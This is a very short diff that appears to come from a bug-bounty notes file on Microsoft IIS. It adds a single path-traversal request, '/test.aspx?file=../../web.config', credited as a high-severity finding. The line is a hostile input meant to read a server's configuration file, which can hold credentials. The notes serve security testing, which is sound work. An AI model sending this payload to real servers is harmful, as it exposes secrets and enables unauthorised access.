@@ -2,7 +2,7 @@ IIS Microsoft
 ========
 
 
-
+/test.aspx?file=../../web.config
 
 Another P1 using 
 @GodfatherOrwa
